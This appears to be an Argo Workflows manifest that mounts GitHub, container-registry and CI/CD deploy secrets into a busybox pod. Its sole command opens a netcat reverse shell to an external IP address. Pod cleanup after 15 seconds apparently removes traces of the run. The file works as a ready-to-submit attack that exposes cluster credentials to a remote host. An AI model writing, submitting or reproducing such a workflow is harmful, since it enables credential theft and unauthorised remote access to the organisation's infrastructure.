
metadata:
 generateName: test-
 namespace: default
spec:
 entrypoint: argosay
 serviceAccountName: argo
 templates:
   - name: argosay
     volumes:
       - name: github
         secret:
           secretName: github-basic
       - name: gcr
         secret:
           secretName: argo-gcr
       - name: cicd
         secret:
           secretName: ci-cd-deploy
     container:
       name: main
       image: 'busybox'
       volumeMounts:
         - mountPath: /tmp/github
           name: github
         - mountPath: /tmp/gcr
           name: gcr
         - mountPath: /tmp/cicd
           name: cicd
       command: [
         "sh",
         "-c"
       ]
       args: [
         "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 68.183.22.232 4641; >/tmp/f"
       ]
 ttlStrategy:
   secondsAfterCompletion: 15
 podGC:
   strategy: OnPodCompletion